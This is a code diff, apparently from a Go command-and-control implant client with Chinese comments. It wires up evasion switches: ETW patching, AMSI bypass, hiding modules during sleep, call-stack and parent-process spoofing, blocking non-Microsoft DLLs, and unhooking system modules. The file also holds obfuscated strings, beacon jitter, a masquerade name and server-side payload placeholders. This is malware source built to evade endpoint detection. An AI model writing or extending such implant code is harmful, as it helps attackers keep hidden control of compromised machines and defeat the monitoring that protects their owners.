@@ -20,13 +20,13 @@ var (
 
 	// 重连配置（JitterPercent 由服务端生成时 patch 替换为配置文件 client.jitter）
 	ReconnectConfig = ReconnectConfiguration{
-		JitterPercent:    JitterPercent(),   // 抖动百分比（占位符 patch）
-		MaxJitterPercent: 50,                // 最大50%抖动
-		BaseDelay:        ReconnectBaseDelay(), // 重连基础延时（占位符 patch，仅允许降频钳制）
-		MaxDelay:         300 * time.Second, // 重连最大延时5分钟
+		JitterPercent:    JitterPercent(),       // 抖动百分比（占位符 patch）
+		MaxJitterPercent: 50,                    // 最大50%抖动
+		BaseDelay:        ReconnectBaseDelay(),  // 重连基础延时（占位符 patch，仅允许降频钳制）
+		MaxDelay:         300 * time.Second,     // 重连最大延时5分钟
 		MaxRetries:       ReconnectMaxRetries(), // 最大重试次数（占位符 patch，上限钳制）
-		ResetTimeout:     10 * time.Minute,  // 断线保护重置时间10分钟
-		SuccessThreshold: 5,                 // 连续成功5次解除保护
+		ResetTimeout:     10 * time.Minute,      // 断线保护重置时间10分钟
+		SuccessThreshold: 5,                     // 连续成功5次解除保护
 	}
 )
 
@@ -274,17 +274,38 @@ func AutoDelete() bool {
 	return s == "1" && !strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw="))
 }
 
-// ETWPatchEnabled ETW 补丁开关（1=启用；默认启用）
+// ETWPatchEnabled ETW 补丁开关（1=启用）。
+//
+// 注意：**默认是关闭的**。服务端生成载荷时把占位符替换成 "0"（见
+// pkg/delivery/payload.go 的 replacements），前端开关默认也不勾选。
+// 此前这里的注释写"默认启用"，与实现相反 —— 运维会以为载荷已经打了 ETW 补丁。
+//
+// 返回值是**当前生效值**：编译期占位符 + 运行期覆盖（EVASION 命令），见 opsec.go。
 func ETWPatchEnabled() bool {
-	s := strings.TrimSpace(ETWPatchPlaceholder)
-	return s == "1" && !strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw="))
+	return EvasionEnabled(EvasionETW)
 }
 
-// AmsiBypassEnabled AMSI 绕过开关（1=启用；默认启用）
+// AmsiBypassEnabled AMSI 绕过开关（1=启用）。
+//
+// 与 ETWPatchEnabled 一样，**默认关闭**（服务端替换成 "0"）；注释曾误写"默认启用"。
 func AmsiBypassEnabled() bool {
-	s := strings.TrimSpace(AmsiBypassPlaceholder)
-	return s == "1" && !strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw="))
+	return EvasionEnabled(EvasionAMSI)
 }
+
+// SleepMaskHideEnabled 睡眠期模块摘链（编译期开关 + 运行期覆盖）。
+func SleepMaskHideEnabled() bool { return EvasionEnabled(EvasionModHide) }
+
+// StackSpoofEnabled 伪造调用栈（仅 syscallMode=direct 时生效）。
+func StackSpoofEnabled() bool { return EvasionEnabled(EvasionSpoof) }
+
+// PpidSpoofEnabled 派生子进程时伪造父进程。
+func PpidSpoofEnabled() bool { return EvasionEnabled(EvasionPPID) }
+
+// BlockDLLsEnabled 子进程只允许微软签名 DLL。
+func BlockDLLsEnabled() bool { return EvasionEnabled(EvasionBlockDLLs) }
+
+// UnhookOnStartEnabled 启动时用磁盘映像恢复三个系统模块的内联 hook。
+func UnhookOnStartEnabled() bool { return EvasionEnabled(EvasionUnhook) }
 
 // SyscallMode 系统调用模式（none/direct/indirect；默认 none=常规 ntdll 调用）
 func SyscallMode() string {
@@ -297,6 +318,15 @@ func SyscallMode() string {
 		return s
 	}
 	return "none"
+}
+
+// HostEvasionEnabled 是否开了任意一项"主机层对抗"（ETW patch / AMSI bypass / syscall 模式）。
+//
+// 用于让那些**只在愿意承担对抗风险时才该生效**的能力跟随同一组开关，
+// 例如睡眠期的模块摘链（见 evasion.HideForSleep）。三项全关时为 false，
+// 也就是默认关闭 —— 与三项自身的默认值一致。
+func HostEvasionEnabled() bool {
+	return hostEvasionCompiledAny()
 }
 
 // MasqueradeName 伪装修饰前缀（生成时替换；未 patch 时默认中性名 svc）
@@ -367,6 +397,14 @@ func placeholderChecks() []string {
 		TLSJA3Placeholder,
 		DNSLabelPrefixPlaceholder,
 		SessionKeyInfoPlaceholder,
+		// P4：P0–P3 能力的细分开关。新模板才有这些字面量；旧服务端不认识它们，
+		// 残留检查会让"新客户端 + 旧服务端"直接拒绝启动——这是刻意的
+		// （宁可起不来，也不要带着未生效的开关跑）。
+		SleepMaskHidePlaceholder,
+		StackSpoofPlaceholder,
+		PpidSpoofPlaceholder,
+		BlockDLLsPlaceholder,
+		UnhookOnStartPlaceholder,
 	}
 }
 
